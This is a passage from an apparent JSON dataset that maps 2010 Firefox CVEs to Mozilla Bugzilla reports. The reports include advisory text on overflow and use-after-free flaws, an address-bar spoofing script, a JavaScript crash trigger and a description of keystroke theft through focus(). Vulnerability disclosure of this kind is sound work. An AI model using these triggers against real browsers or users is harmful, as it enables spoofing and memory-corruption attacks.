mNKeys++; // XXX return NS_OK; } After counting and copying the number of keys, the application will proceed to sort the elements in this buffer. It does this by first allocating via the following code. content/xslt/src/xslt/txNodeSorter.cpp:157 nsresult txNodeSorter::sortNodeSet(txNodeSet* aNodes, txExecutionState* aEs, txNodeSet** aResult) { if (mNKeys == 0 || aNodes->isEmpty()) { NS_ADDREF(*aResult = aNodes); return NS_OK; } *aResult = nsnull; nsRefPtr<txNodeSet> sortedNodes; nsresult rv = aEs->recycler()->getNodeSet(getter_AddRefs(sortedNodes)); NS_ENSURE_SUCCESS(rv, rv); txNodeSetContext* evalContext = new txNodeSetContext(aNodes, aEs); NS_ENSURE_TRUE(evalContext, NS_ERROR_OUT_OF_MEMORY); rv = aEs->pushEvalContext(evalContext); NS_ENSURE_SUCCESS(rv, rv); // Create and set up memoryblock for sort-values and indexarray PRUint32 len = static_cast<PRUint32>(aNodes->size()); // XXX void* mem = PR_Malloc(len * (sizeof(PRUint32) + mNKeys * sizeof(TxObject*))); // XXX NS_ENSURE_TRUE(mem, NS_ERROR_OUT_OF_MEMORY); PRUint32* indexes = static_cast<PRUint32*>(mem); // XXX TxObject** sortValues = reinterpret_cast<TxObject**>(indexes + len); PRUint32 i; for (i = 0; i < len; ++i) { indexes[i] = i; } memset(sortValues, 0, len * mNKeys * sizeof(TxObject*)); The misallocation is located in the following line of code. In this case, the attacker controls more than 32 of the bits within the allocation which will allow one to cause an integer overflow. void* mem = PR_Malloc(len * (sizeof(PRUint32) + mNKeys * sizeof(TxObject*))); Upon causing of the integer overflow, a copy exists which initializes that underallocated buffer. PRUint32 i; for (i = 0; i < len; ++i) { indexes[i] = i; } Version(s) tested: Mozilla Firefox 3.6 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * Martin Barbella"
      }
    ],
    "CVE-2010-1204": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=309952",
        "title": "[SECURITY] A boolean chart search with time tracking fields works for everybody",
        "description": "A user can execute a boolean chart search that has a time tracking field even though the user isn't in the group defined by timetrackinggroup param. This way one could search for all bugs that have worked time equal to 2 and get a list of all bugs that have taken 2 hours to finish. Time tracking fields are not shown on the drop-down for these users so URL hacking or a previously saved query needs to be used to trigger this."
      }
    ],
    "CVE-2010-1206": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=556957",
        "title": "Address bar spoofing possible via window.open() + HTTP 204 responses or window.stop()",
        "description": "Hi folks, A considerable number of large sites on the Internet have at least one write-only location that responds with HTTP 204 (\"No content\") when queried directly. Unfortunately, Firefox seems to handle 204 responses in a weird way, in some cases displaying the new URL in the URL bar, but keeping the old document in place. Specifically, consider this example: -- snip! -- <html> <input type=submit value=\"Click me now\" onclick=\"clicked()\"> <script> var w; function clicked() { w = window.open(\"https://www.google.com/csi\",\"_blank\"); setTimeout('w.document.body.innerHTML = \"I am not https://www.google.com at all!\"', 500); } </script> -- snip! -- This, obviously, looks pretty bad."
      }
    ],
    "CVE-2010-1207": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=571287",
        "title": "same-origin checks incorrect on canvas",
        "description": "We currently have a notion of a \"write-only\" canvas, to not allow reading data after an image or other non-same-origin content has been rendered into it. However, that flag lives on the canvas, and not the context; the context can outlive the canvas. We do the check here: http://hg.mozilla.org/mozilla-central/file/7b15545cf9aa/content/canvas/src/nsCanvasRenderingContext2D.cpp#l3506 but only if we have a mCanvasElement -- which can become null if that element is GC'd. In that case as part of the destruction process, we call SetCanvasElement with nsnull, and the context doesn't keep a strong reference to the canvas. The right fix seems to be to keep the element alive for the lifetime of the context: you can then reattach it to the dom via ctx.canvas, whereas once you orphan a context you can't ever attach it to a canvas. The other potential fix is to move the origin-clean flag to the context itself. The first is probably the right solution, patch coming up."
      }
    ],
    "CVE-2010-1208": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=572986",
        "title": "DOM Attribute Cloning Remote Code Execution Vulnerability (ZDI-CAN-832)",
        "description": "ZDI-CAN-832: Mozilla Firefox DOM Attribute Cloning Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists due to a workaround that was implemented in order to support recursive cloning of attribute nodes. If an event is added to the first attribute node, the application can be made to free the node, and then later access a reference to it. This can lead to code execution under the context of the application. The issue occurs due to a workaround in the application using the first child when cloning an attribute node and inserting children. Due to the side-effect of a attribute's children not actually being inserted due to bug id 56758 [https://bugzilla.mozilla.org/show_bug.cgi?id=56758], an event can be made to remove each attribute. This will then free a reference to an attribute node, which can then be replaced with another type of the same size. The application will later use this freed type. content\\base\\src\\nsNodeUtils.cpp:517 nsresult nsNodeUtils::CloneAndAdopt(nsINode *aNode, PRBool aClone, PRBool aDeep, nsNodeInfoManager *aNewNodeInfoManager, JSContext *aCx, JSObject *aOldScope, JSObject *aNewScope, nsCOMArray<nsINode> &aNodesWithProperties, nsINode *aParent, nsIDOMNode **aResult) ... // The DOM spec says to always adopt/clone/import the children of attribute // nodes. // XXX The following block is here because our implementation of attribute // nodes is broken when it comes to inserting children. Instead of cloning // their children we force creation of the only child by calling // GetChildAt(0). We can remove this when // https://bugzilla.mozilla.org/show_bug.cgi?id=56758 is fixed. if (aClone && aNode->IsNodeOfType(nsINode::eATTRIBUTE)) { nsCOMPtr<nsINode> attrChildNode = aNode->GetChildAt(0); // We only need to do this if the child node has properties (because we // might need to call a userdata handler). if (attrChildNode && attrChildNode->HasProperties()) { nsCOMPtr<nsINode> clonedAttrChildNode = clone->GetChildAt(0); if (clonedAttrChildNode) { PRBool ok = aNodesWithProperties.AppendObject(attrChildNode) && aNodesWithProperties.AppendObject(clonedAttrChildNode); NS_ENSURE_TRUE(ok, NS_ERROR_OUT_OF_MEMORY); } } } Version(s) tested: Mozilla Firefox 3.6.3 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-1209": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552110",
        "title": "Use of deleted object by NodeIterator using NodeFilter which called detach (ZDI-CAN-712)",
        "description": "ZDI-CAN-712: Mozilla Firefox NodeIterator Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the victim must visit a malicious page or open a malicious file. The specific flaw exists within the application's implementation of the NodeIterator interface for traversal of the Document Object Model. Due to the implementation requiring a javascript callback, an attacker can utilize the callback in order to manipulate the contents of the page. By doing so in an unexpected manner, an attacker can cause the process to corrupt memory. Successful exploitation will lead to code execution under the context of the application. The particular issue is located within Mozilla Firefox's implemenation of Document Traversal and involves both the NodeFilter and NodeIterator interfaces. The NodeIterator interface allows one to specify a NodeFilter in order to allow a finer granularity of control over which nodes will be traversed. A NodeIterator's interface as specified at (http://www.w3.org/TR/DOM-Level-2-Traversal-Range/traversal.html#Traversal-NodeIterator) is defined as: // Introduced in DOM Level 2: interface NodeIterator { readonly attribute Node root; readonly attribute unsigned long whatToShow; readonly attribute NodeFilter filter; readonly attribute boolean expandEntityReferences; Node nextNode() raises(DOMException); Node previousNode() raises(DOMException); void detach(); }; This interface contains two methods which are used to trigger this vulnerability. The first one is the 'filter' property. This is a readonly attribute that's set on creation of a NodeIterator. The next one is detach() which will detach a node from the tree. The implementation of this primarily resides within content/base/src/nsNodeIterator.cpp. Creation of a NodeIterator first starts within the following snippet. One of the parameters is the specified filter. content/base/src/nsDocument.cpp:4767 NS_IMETHODIMP nsDocument::CreateNodeIterator(nsIDOMNode *aRoot, PRUint32 aWhatToShow, nsIDOMNodeFilter *aFilter, // XXX PRBool aEntityReferenceExpansion, nsIDOMNodeIterator **_retval) { *_retval = nsnull; if (!aRoot) return NS_ERROR_DOM_NOT_SUPPORTED_ERR; nsresult rv = nsContentUtils::CheckSameOrigin(this, aRoot); NS_ENSURE_SUCCESS(rv, rv); NS_ENSURE_ARG_POINTER(_retval); nsCOMPtr<nsINode> root = do_QueryInterface(aRoot); NS_ENSURE_TRUE(root, NS_ERROR_DOM_NOT_SUPPORTED_ERR); nsNodeIterator *iterator = new nsNodeIterator(root, aWhatToShow, aFilter, // XXX aEntityReferenceExpansion); This will then instantiated a new NodeIterator which will then create an nsTraversal object which will utilize the specified filter and store it as one of it's properties. content/base/src/nsNodeIterator.cpp:183 nsNodeIterator::nsNodeIterator(nsINode *aRoot, PRUint32 aWhatToShow, nsIDOMNodeFilter *aFilter, PRBool aExpandEntityReferences) : nsTraversal(aRoot, aWhatToShow, aFilter, aExpandEntityReferences), // XXX mDetached(PR_FALSE), mPointer(mRoot, PR_TRUE) { aRoot->AddMutationObserver(this); } Iteration of a NodeIterator is then performed via the nextNode() and prevNode() methods. The implementation of the nextNode() method is located in the following file. If there is a filter, this code will ask the filter function if the node is valid, and if so will return it. To accomplish this, the application will use the TestNode method. content/base/src/nsNodeIterator.cpp:264 /* nsIDOMNode nextNode () raises (DOMException); */ NS_IMETHODIMP nsNodeIterator::NextNode(nsIDOMNode **_retval) { nsresult rv; PRInt16 filtered; *_retval = nsnull; if (mDetached) return NS_ERROR_DOM_INVALID_STATE_ERR; mWorkingPointer = mPointer; while (mWorkingPointer.MoveToNext(mRoot)) { nsCOMPtr<nsINode> testNode = mWorkingPointer.mNode; rv = TestNode(testNode, &filtered); // XXX NS_ENSURE_SUCCESS(rv, rv); if (filtered == nsIDOMNodeFilter::FILTER_ACCEPT) { mPointer = mWorkingPointer; mWorkingPointer.Clear(); return CallQueryInterface(testNode, _retval); } } mWorkingPointer.Clear(); return NS_OK; } nsTraversal::TestNode will then call the filtering function and return the filtervalue of the particular node that the iterator currently has. This will then call the AcceptNode method of the NodeFilter interface. content/base/src/nsTraversal.cpp:67 /* * Tests if and how a node should be filtered. Uses mWhatToShow and * mFilter to test the node. * @param aNode Node to test * @param _filtered Returned filtervalue. See nsIDOMNodeFilter.idl * @returns Errorcode */ nsresult nsTraversal::TestNode(nsINode* aNode, PRInt16* _filtered) { nsresult rv; *_filtered = nsIDOMNodeFilter::FILTER_SKIP; PRUint16 nodeType = 0; // Check the most common cases if (aNode->IsNodeOfType(nsINode::eELEMENT)) { nodeType = nsIDOMNode::ELEMENT_NODE; } else if (aNode->IsNodeOfType(nsINode::eCONTENT)) { nsIAtom* tag = static_cast<nsIContent*>(aNode)->Tag(); if (tag == nsGkAtoms::textTagName) { nodeType = nsIDOMNode::TEXT_NODE; } else if (tag == nsGkAtoms::cdataTagName) { nodeType = nsIDOMNode::CDATA_SECTION_NODE; } else if (tag == nsGkAtoms::commentTagName) { nodeType = nsIDOMNode::COMMENT_NODE; } else if (tag == nsGkAtoms::processingInstructionTagName) { nodeType = nsIDOMNode::PROCESSING_INSTRUCTION_NODE; } } nsCOMPtr<nsIDOMNode> domNode; if (!nodeType) { domNode = do_QueryInterface(aNode); rv = domNode->GetNodeType(&nodeType); NS_ENSURE_SUCCESS(rv, rv); } if (nodeType <= 12 && !((1 << (nodeType-1)) & mWhatToShow)) { return NS_OK; } if (mFilter) { // XXX if (!domNode) { domNode = do_QueryInterface(aNode); } return mFilter->AcceptNode(domNode, _filtered); // XXX } *_filtered = nsIDOMNodeFilter::FILTER_ACCEPT; return NS_OK; } A NodeFilter interface is located at (http://www.w3.org/TR/DOM-Level-2-Traversal-Range/traversal.html#Traversal-NodeFilter) and can be defined as. interface NodeFilter { // Constants returned by acceptNode const short FILTER_ACCEPT = 1; const short FILTER_REJECT = 2; const short FILTER_SKIP = 3; // Constants for whatToShow const unsigned long SHOW_ALL = 0xFFFFFFFF; const unsigned long SHOW_ELEMENT = 0x00000001; const unsigned long SHOW_ATTRIBUTE = 0x00000002; const unsigned long SHOW_TEXT = 0x00000004; const unsigned long SHOW_CDATA_SECTION = 0x00000008; const unsigned long SHOW_ENTITY_REFERENCE = 0x00000010; const unsigned long SHOW_ENTITY = 0x00000020; const unsigned long SHOW_PROCESSING_INSTRUCTION = 0x00000040; const unsigned long SHOW_COMMENT = 0x00000080; const unsigned long SHOW_DOCUMENT = 0x00000100; const unsigned long SHOW_DOCUMENT_TYPE = 0x00000200; const unsigned long SHOW_DOCUMENT_FRAGMENT = 0x00000400; const unsigned long SHOW_NOTATION = 0x00000800; short acceptNode(in Node n); }; If a malicious javascript filter that removes the elements the NodeIterator is iterating over, the application will access memory that's freed while the node is being iterated. Version(s) tested: Mozilla Firefox 3.6 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-1210": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=564679",
        "title": "Bytes mapped to U+FFFD in 8-bit encodings make the following byte/character disappear",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.3a5pre) Gecko/20100508 Minefield/3.7a5pre Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.3a5pre) Gecko/20100508 Minefield/3.7a5pre Many 8-bit encodings contain undefined positions, which are mapped to U+FFFD. In the last Minefield for Mac, such bytes are correctly mapped to U+FFFD, but the immediately following byte disappears(!). For example, the sequence {'\\xD1', '\\xD2', '\\xD3', 'xD4'} in windows-1253 should result in {U+3A1, U+FFFD, U+3A3, U+3A4} (i.e., the string \"Ρ�ΣΤ\"), but the actual result is the shorter sequence {U+3A1, U+FFFD, U+3A4} with no U+3A3 character (i.e., the string \"Ρ�Τ\", with no 'Σ'). (Two consecutive bytes both mapped to U+FFFD result in only one U+FFFD character instead of two.) This seems to be a general problem; it does apply to several windows-* and ISO-8859-* encodings. Firefox 3.6.3 (release) shows the same incorrect behaviour. This bug did not exist in Firefox 3.5.8. [Incidentally, it might make sense to map bytes in the range 0x7F..0x9F to U+7F..U+9F and not to U+FFFD for many of the affected encodings, but that is a separate issue and would in any case not solve the current problem completely since many encodings, including windows-1253, have undefined characters outside this range, for which U+FFFD is the only reasonable mapping.] Reproducible: Always"
      }
    ],
    "CVE-2010-1212": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=530955",
        "title": "New crash [@ ExecuteTree] in Firefox 3.6b3",
        "description": "There's a new crash in Firefox 3.6b3 with the signature \"ExecuteTree\" in Firefox 3.6b3 that hasn't been seen in any of the versions 3\\.5.*. So far we've seen 78+ of these crashes in the wild. Please see http://crash-stats.mozilla.com/query/query?product=Firefox&version=Firefox%3A3.6b3&range_value=1&range_unit=weeks&query_search=signature&query_type=exact&query=ExecuteTree&do_query=1 for more crash info."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=568855",
        "title": "Crash [@ nanojit::LIns::opcode] with non-native __proto__",
        "description": "this.__proto__ = Proxy.create({has:function(){return false}}); (function(){ eval(\"(function(){ for(var j=0;j<6;++j) if(j%2==1) p=0; })\")(); })() Triggers one of the following (all in a debug build): * Crash [@ nanojit::LIns::opcode] * Crash [@ nanojit::LirWriter::insImmI] * Assertion failed: 0 (../nanojit/LIR.cpp:996) * Assertion failure: status == ARECORD_COMPLETED || status == ARECORD_ABORTED || status == ARECORD_ERROR, at ../jstracer.cpp:7139 The proliferation of assertions and crashes may make this annoying for jsfunfuzz."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=558618",
        "title": "TM: Crash [@ js_ValueToString] - Segfault when accessing out-of-range arguments on trace",
        "description": "/* vim: set ts=4 sw=4 tw=99 et: */ function f() { this.search = function(a, b, c) { arguments[3] = { } arguments.length = 4; for (var i = 0; i < 100; i++) { print(arguments[3]); } } } var o = new f(); o.search({x: -1, y: -1, w: 100600, h: 100600});"
      }
    ],
    "CVE-2010-1213": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=568148",
        "title": "Combining \"importScripts\" of WebWorker with E4X causes information disclosure",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) \"importScripts\" method reads remote resources as a javascript even if that is not a JavaScript file. And \"importScripts\" method sent cookies to remote server at requesting their resources. Additionally, \"importScripts\" method can read HTML file as JavaScript source using E4X feature. Thus attacker can read the victim's protected HTML file using \"importScripts\" and E4X across the domain. Reproducible: Always Steps to Reproduce: see demo page for details. http://openmya.hacker.jp/hasegawa/PoC/webworker.html Actual Results: attacker can read remote contents. Expected Results: \"importScripts\" should fail to read HTML as a javascript source, like as <script src=\"html\">"
      }
    ],
    "CVE-2010-1214": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=572985",
        "title": "Plugin Parameter EnsureCachedAttrParamArrays Remote Code Execution Vulnerability (ZDI-CAN-821)",
        "description": "ZDI-CAN-821: Mozilla Firefox Plugin Parameter EnsureCachedAttrParamArrays Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the browser's method for parsing child elements out of a particular tag. The application will use a 32-bit index to enumerate them, but will store it in a 16-bit signed integer and then use it to allocate space for a cache. When populating the cache a buffer overflow will occur. This can lead to code execution under the context of the application. The issue occurs within the application's support for parameters within plugins. The application will create a cache for each parameter value and name. This is done by enumerating the total number of parameters and storing it. When calculating the size needed for the cache, the application will store the total number of results into a signed integer. This will cause the arithmetic required to undercalculate the size for the allocation. Later when this cache is populated the buffer overflow will occur. After parsing the elements required for a plugin, the application will enter the following code which will count the number of elements for the cached Attribute/Param array. layout/generic/nsObjectFrame.cpp:2873 nsresult nsPluginInstanceOwner::EnsureCachedAttrParamArrays() { if (mCachedAttrParamValues) return NS_OK; NS_PRECONDITION(((mNumCachedAttrs + mNumCachedParams) == 0) && !mCachedAttrParamNames, \"re-cache of attrs/params not implemented! use the DOM \" \"node directy instead\"); NS_ENSURE_TRUE(mOwner, NS_ERROR_NULL_POINTER); // first, we need to find out how much we need to allocate for our // arrays count up attributes mNumCachedAttrs = 0; PRUint32 cattrs = mContent->GetAttrCount(); if (cattrs < 0x0000FFFF) { // unsigned 32 bits to unsigned 16 bits conversion mNumCachedAttrs = static_cast<PRUint16>(cattrs); } else { mNumCachedAttrs = 0xFFFE; // minus one in case we add an extra \"src\" entry below } // now, we need to find all the PARAM tags that are children of us // however, be carefull NOT to include any PARAMs that don't have us // as a direct parent. For nested object (or applet) tags, be sure // to only round up the param tags that coorespond with THIS // instance. And also, weed out any bogus tags that may get in the // way, see bug 39609. Then, with any param tag that meet our // qualification, temporarly cache them in an nsCOMArray until // we can figure out what size to make our fixed char* array. mNumCachedParams = 0; After counting the number of elements, this will be assigned to a 16-bit integer and then used in an allocation. layout/generic/nsObjectFrame.cpp:2938 if (allParams) { PRUint32 numAllParams; allParams->GetLength(&numAllParams); // loop through every so called dependent PARAM tag to check if it // \"belongs\" to us for (PRUint32 i = 0; i < numAllParams; i++) { nsCOMPtr<nsIDOMNode> pnode; allParams->Item(i, getter_AddRefs(pnode)); nsCOMPtr<nsIDOMElement> domelement = do_QueryInterface(pnode); if (domelement) { ... nsCOMPtr<nsIDOMNode> mydomNode = do_QueryInterface(mydomElement); if (parent == mydomNode) { ourParams.AppendObject(domelement); } } } } } } // We're done with DOM method calls now; make sure we still have a frame. NS_ENSURE_TRUE(mOwner, NS_ERROR_OUT_OF_MEMORY); PRUint32 cparams = ourParams.Count(); // unsigned 32 bits to unsigned 16 bits conversion if (cparams < 0x0000FFFF) mNumCachedParams = static_cast<PRUint16>(cparams); else mNumCachedParams = 0xFFFF; ... PRInt16 numRealAttrs = mNumCachedAttrs; // XXX: implied type conversion from unsigned to signed nsAutoString data; if (mContent->Tag() == nsGkAtoms::object && !mContent->HasAttr(kNameSpaceID_None, nsGkAtoms::src) && mContent->GetAttr(kNameSpaceID_None, nsGkAtoms::data, data)) { mNumCachedAttrs++; } // now lets make the arrays mCachedAttrParamNames = (char **)PR_Calloc(sizeof(char *) * (mNumCachedAttrs + 1 + mNumCachedParams), 1); // XXX: signed integer being used in an allocation NS_ENSURE_TRUE(mCachedAttrParamNames, NS_ERROR_OUT_OF_MEMORY); mCachedAttrParamValues = (char **)PR_Calloc(sizeof(char *) * (mNumCachedAttrs + 1 + mNumCachedParams), 1); // XXX: signed integer being used in an allocation NS_ENSURE_TRUE(mCachedAttrParamValues, NS_ERROR_OUT_OF_MEMORY); The following code will then populate the allocated memory with the cache. This will overflow the underallocated buffer that was provided. layout/generic/nsObjectFrame.cpp:3038 // Some plugins (eg Flash, see bug 234675.) are actually sensitive to the // attribute order. So we want to make sure we give the plugin the // attributes in the order they came in in the source, to be compatible with // other browsers. Now in HTML, the storage order is the reverse of the // source order, while in XML and XHTML it's the same as the source order // (see the AddAttributes functions in the HTML and XML content sinks). PRInt16 start, end, increment; if (mContent->IsNodeOfType(nsINode::eHTML) && mContent->NodeInfo()->NamespaceEquals(kNameSpaceID_None)) { // HTML. Walk attributes in reverse order. start = numRealAttrs - 1; end = -1; increment = -1; } else { // XHTML or XML. Walk attributes in forward order. start = 0; end = numRealAttrs; increment = 1; } for (PRInt16 index = start; index != end; index += increment) { const nsAttrName* attrName = mContent->GetAttrNameAt(index); nsIAtom* atom = attrName->LocalName(); nsAutoString value; mContent->GetAttr(attrName->NamespaceID(), atom, value); nsAutoString name; atom->ToString(name); FixUpURLS(name, value); mCachedAttrParamNames [c] = ToNewUTF8String(name); mCachedAttrParamValues[c] = ToNewUTF8String(value); c++; } Version(s) tested: Mozilla Firefox 3.6.3 Platform(s) tested: Windows XP SP3 -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * J23 (http://twitter.com/HansJ23)"
      }
    ],
    "CVE-2010-1215": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=567069",
        "title": "Security problem with SJOW and fast native function",
        "description": "Since SafeCallGuard sets cx->fp to null, when a fast native function is called via SJOW, cx->fp is null. And, when NewObject(cx, clasp, NULL, NULL) is called, js_GetClassPrototype uses cx->globalObject as scope if cx->fp is null. Thus, if a code running on a chrome's context accesses a content object via SJOW, a content code can get an object from the chrome's scope and run arbitrary code with chrome privileges by using that object. Trunk and 1.9.2 are affected. (On older branches, SJOW creates scripted callers instead of using SafeCallGuard.) Firebug and DOM Inspector are exploitable."
      }
    ],
    "CVE-2010-1585": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=562547",
        "title": "ParanoidFragmentSinks allow javascript: urls in chrome documents",
        "description": "The two ns(X)HTMLParanoidFragmentSink classes are used by nsIScriptableUnescapeHTML to sanitize (X)HTML by stripping attributes and tags not on a built-in whitelist. Internally to Firefox this is only used by the feed processor, but it's fairly popular with add-on authors and recommended as a best-practice. The sinks attempt to sanitize URLs by calling CheckLoadURI[...]DISALLOW_INHERIT_PRINCIPAL), but unfortunately when the target document is a chrome document (as is common with add-ons) this check allows any URI. In particular malicious href=\"javascript:evil()\" or <iframe src=\"data:evil\"> can slip through and create sg-critical bugs. http://hg.mozilla.org/mozilla-central/annotate/c753325a40ff/content/html/document/src/nsHTMLFragmentContentSink.cpp#l967 and ditto content/xml/document/src/nsXMLFragmentContentSink.cpp Would it be OK to simply always pass a nsNullPrincipal in instead? This problem was recently published in a whitepaper referenced at http://www.securityfocus.com/archive/1/archive/1/510883/100/0/threaded Cross Context Scripting with Firefox - Roberto Suggi Liverani Link: http://www.security-assessment.com/files/whitepapers/Cross_Context_Scrip ting_with_Firefox.pdf MITRE has apparently assigned this CVE-2010-1585"
      }
    ],
    "CVE-2010-2295": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552255",
        "title": "focus() behavior may be used to inject, maybe steal keystrokes",
        "description": "Hi folks, I originally thought this only applies to WebKit, but realized it can be tweaked to work with Firefox only after making this proof-of-concept public. Sorry for that - it's fairly low risk, but probably interesting: http://lcamtuf.coredump.cx/focus-webkit/ This PoC is probably Windows-specific. Unlike clickjacking, this permits a fairly high degree of sophistication in interacting with third-party sites. An obvious way to mitigate the risk is to mimic the behavior of MSIE / Opera - that is: 1) Forbid or defer focus changes between onkeydown and onkeyup, so that a malicious page can't see what's being pressed, but deliver the result elsewhere, 2) When focus is grabbed by another document in an IFRAME, and then returned, we should probably not attempt to restore it to the last known editing location, but reset it instead. Now, the more interesting part. NOTE: THIS PART OF THE BUG IS NOT PUBLIC. We also noticed that the following is possible in WebKit browsers, and to a more limited extent and with some tweaks, in MSIE: http://lcamtuf.coredump.cx/focus-webkit/toplevel.html In essence, the same attack can be reversed, and allow cross-domain IFRAME gadgets to steal keystrokes (including password field entries) transparently. This attack does not work on Firefox as-is, but this seems to be due to a conjunction of what I presume are two bugs; and not a conscious security decision: 1) Calling top.focus() always seem to be silently ignored, even if the current browser window is, in fact, in focus, and the call is being made from a currently in-focus IFRAME on that page. In other browsers, this simply returns focus to the top-level document. In Firefox, it does not, presumably because of an overzealous anti-annoyance filter meant to prevent pop-ups from doing setInterval('focus()',1). 2) The other way to approach this would be to call <iframedwindow>.blur(), but counterintuitively, this blurs the entire browser window (and amusingly, doing setInterval('blur()',1) from within an IFRAME makes the browser unusable). This looks like something that may eventually get fixed by accident. I suspect there might be some other way to restore focus to the top-level doc, but I have no obvious ideas. Even if not, it is a more compelling argument to implement the aforementioned changes to focus behavior."
      }
    ],
    "CVE-2010-2441": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552255",
        "title": "focus() behavior may be used to inject, maybe steal keystrokes",
        "description": "Hi folks, I originally thought this only applies to WebKit, but realized it can be tweaked to work with Firefox only after making this proof-of-concept public. Sorry for that - it's fairly low risk, but probably interesting: http://lcamtuf.coredump.cx/focus-webkit/ This PoC is probably Windows-specific. Unlike clickjacking, this permits a fairly high degree of sophistication in interacting with third-party sites. An obvious way to mitigate the risk is to mimic the behavior of MSIE / Opera - that is: 1) Forbid or defer focus changes between onkeydown and onkeyup, so that a malicious page can't see what's being pressed, but deliver the result elsewhere, 2) When focus is grabbed by another document in an IFRAME, and then returned, we should probably not attempt to restore it to the last known editing location, but reset it instead. Now, the more interesting part. NOTE: THIS PART OF THE BUG IS NOT PUBLIC. We also noticed that the following is possible in WebKit browsers, and to a more limited extent and with some tweaks, in MSIE: http://lcamtuf.coredump.cx/focus-webkit/toplevel.html In essence, the same attack can be reversed, and allow cross-domain IFRAME gadgets to steal keystrokes (including password field entries) transparently. This attack does not work on Firefox as-is, but this seems to be due to a conjunction of what I presume are two bugs; and not a conscious security decision: 1) Calling top.focus() always seem to be silently ignored, even if the current browser window is, in fact, in focus, and the call is being made from a currently in-focus IFRAME on that page. In other browsers, this simply returns focus to the top-level document. In Firefox, it does not, presumably because of an overzealous anti-annoyance filter meant to prevent pop-ups from doing setInterval('focus()',1). 2) The other way to approach this would be to call <iframedwindow>.blur(), but counterintuitively, this blurs the entire browser window (and amusingly, doing setInterval('blur()',1) from within an IFRAME makes the browser unusable). This looks like something that may eventually get fixed by accident. I suspect there might be some other way to restore focus to the top-level doc, but I have no obvious ideas. Even if not, it is a more compelling argument to implement the aforementioned changes to focus behavior."
      }
    ],
    "CVE-2010-2442": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552255",
        "title": "focus() behavior may be used to inject, maybe steal keystrokes",
        "description": "Hi folks, I originally thought this only applies to WebKit, but realized it can be tweaked to work with Firefox only after making this proof-of-concept public. Sorry for that - it's fairly low risk, but probably interesting: http://lcamtuf.coredump.cx/focus-webkit/ This PoC is probably Windows-specific. Unlike clickjacking, this permits a fairly high degree of sophistication in interacting with third-party sites. An obvious way to mitigate the risk is to mimic the behavior of MSIE / Opera - that is: 1) Forbid or defer focus changes between onkeydown and onkeyup, so that a malicious page can't see what's being pressed, but deliver the result elsewhere, 2) When focus is grabbed by another document in an IFRAME, and then returned, we should probably not attempt to restore it to the last known editing location, but reset it instead. Now, the more interesting part. NOTE: THIS PART OF THE BUG IS NOT PUBLIC. We also noticed that the following is possible in WebKit browsers, and to a more limited extent and with some tweaks, in MSIE: http://lcamtuf.coredump.cx/focus-webkit/toplevel.html In essence, the same attack can be reversed, and allow cross-domain IFRAME gadgets to steal keystrokes (including password field entries) transparently. This attack does not work on Firefox as-is, but this seems to be due to a conjunction of what I presume are two bugs; and not a conscious security decision: 1) Calling top.focus() always seem to be silently ignored, even if the current browser window is, in fact, in focus, and the call is being made from a currently in-focus IFRAME on that page. In other browsers, this simply returns focus to the top-level document. In Firefox, it does not, presumably because of an overzealous anti-annoyance filter meant to prevent pop-ups from doing setInterval('focus()',1). 2) The other way to approach this would be to call <iframedwindow>.blur(), but counterintuitively, this blurs the entire browser window (and amusingly, doing setInterval('blur()',1) from within an IFRAME makes the browser unusable). This looks like something that may eventually get fixed by accident. I suspect there might be some other way to restore focus to the top-level doc, but I have no obvious ideas. Even if not, it is a more compelling argument to implement the aforementioned changes to focus behavior."
      }
    ],
    "CVE-2010-2454": [
      {
